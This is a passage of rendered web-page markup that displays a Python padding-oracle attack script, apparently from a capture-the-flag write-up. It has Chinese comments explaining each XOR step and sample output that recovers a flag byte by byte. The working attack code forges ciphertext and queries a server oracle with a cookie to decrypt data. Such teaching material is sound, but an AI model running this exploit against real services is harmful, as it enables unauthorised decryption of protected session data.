keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("reversed")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cipher_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#倒序开始处理 9 8 5 4 3 2 1")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" size_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#0，1，2.。。15 每个block都从0开始，0代表每个block的第一个字节")]),t._v("\n            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" ct_pos "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("256")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#0，1，2.。。255 测试256个字符")]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 1 xor 1 = 0 or valide padding need to be checked")]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" ct_pos "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!=")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("or")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("valide_value"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("and")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("valide_value"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" ct_pos\n                "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n\n                    bk "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" block_search_byte"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("size_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" ct_pos"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" valide_value"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#第一个测试字符是00000000000000000000000000000000")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#第二个测试字符是00000000000000000000000000000001")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#直到0000000000000000000000000000000a")]),t._v("\n                    bp "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" cipher_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#取C(i-1) cipher_block[8] = A8A0A4A4482A135A84DED47F5036FE83")]),t._v("\n                    bc "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" block_padding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("size_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#目前是测试第一位，所以合法的padding是00000000000000000000000000000001")]),t._v("\n                    tmp "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" hex_xor"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("bk"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" bp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#测试bk这个猜测的0-255字符是否能跟bp的消掉/相等（理解错误，实际上这里无法判断能否消掉，只有发送给服务器那边Decrypt之后才知道！）")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# hex_xor('0000000000000000000000000000000a','A8A0A4A4482A135A84DED47F5036FE83')")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# =a8a0a4a4482a135a84ded47f5036fe89")]),t._v("\n                    cb "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" hex_xor"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("tmp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" bc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("upper"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" \n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# hex_xor('a8a0a4a4482a135a84ded47f5036fe89','00000000000000000000000000000001')")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# =a8a0a4a4482a135a84ded47f5036fe88，upper：A8A0A4A4482A135A84DED47F5036FE88")]),t._v("\n\n                    up_cipher "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" cb "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" cipher_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# A8A0A4A4482A135A84DED47F5036FE**88** | 7DD2FB70131CFF2FCFAFA2FC4994187E             ")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# time.sleep(0.5)")]),t._v("\n\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# we call the oracle, our god")]),t._v("\n                    connection"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" response "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" call_oracle"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n                        host"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" method"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" up_cipher\n                    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                    \n                    exe "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" re"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("findall"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('".."')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" cb"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#['A8', 'A0', 'A4', 'A4', '48', '2A', '13', '5A', '84', 'DE', 'D4', '7F', '50', '36', 'FE', '88']")]),t._v("\n\t\t\t\t\tdiscover "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("join"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("exe"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("size_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" size_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#当前是空")]),t._v("\n\t\t\t\t\tcurrent "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("join"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("exe"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("size_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" size_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#当前是'88'")]),t._v("\n\t\t\t\t\tfind_me "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("join"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("exe"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# A8A0A4A4482A135A84DED47F5036FE")]),t._v("\n\n\t\t\t\t\tsys"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("stdout"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\r[+] Test [Byte %03i/256 - Block %d ]: \\033[31m%s\\033[33m%s\\033[36m%s\\033[0m"')]),t._v("\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ct_pos"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" find_me"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" current"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" discover"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t\t\t\t\t\t\n\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Test "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("Byte "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("010")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("256")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" Block "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("9")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("31mA8A0A4A4482A135A84DED47F5036FE"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("33m88"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("36m"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("0m\n                                  \n                    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" test_validity_customize"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" error"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n\n                        found "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("True")]),t._v("\n                        connection"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("close"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n                        "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# data analyse and insert in right order")]),t._v("\n                        value "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" re"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("findall"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('".."')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" bk"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n              \t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# ['00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '0a']")]),t._v("\n                        valide_value"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("insert"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" value"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("size_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#['0a']")]),t._v("\n\n                        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("verbose "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("True")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"[+] HTTP "')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("status"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("reason"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"[+] Block M_Byte : %s"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" bk"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"[+] Block C_{i-1}: %s"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" bp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"[+] Block Padding: %s"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" bc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#找到最后一个block的第一个字节")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" HTTP  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" OK\n                            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block M_Byte "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0000000000000000000000000000000a")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block C_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("i"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" A8A0A4A4482A135A84DED47F5036FE83\n                            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block Padding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000000000000000000000000000001")]),t._v("\n\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("36m"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("1m"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(""),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("0m Found "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0a")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#找到最后一个block的最后一个字节   ")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" HTTP  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" OK\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block M_Byte "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("47517e7e227d0a0a0a0a0a0a0a0a0a0a")]),t._v("\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block C_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("i"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" A8A0A4A4482A135A84DED47F5036FE83\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block Padding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10101010101010101010101010101010")]),t._v("\n\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("36m"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("1m"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(""),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("0m Found "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("47517e7e227d0a0a0a0a0a0a0a0a0a0a")]),t._v("\n\t\t\t\t\t\t\t\n                            "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#找到第一个block的最后一个字节")]),t._v("\n                            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" HTTP  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" OK\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block M_Byte "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7b22666c6167223a20225e464c41475e")]),t._v("\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block C_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("i"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token 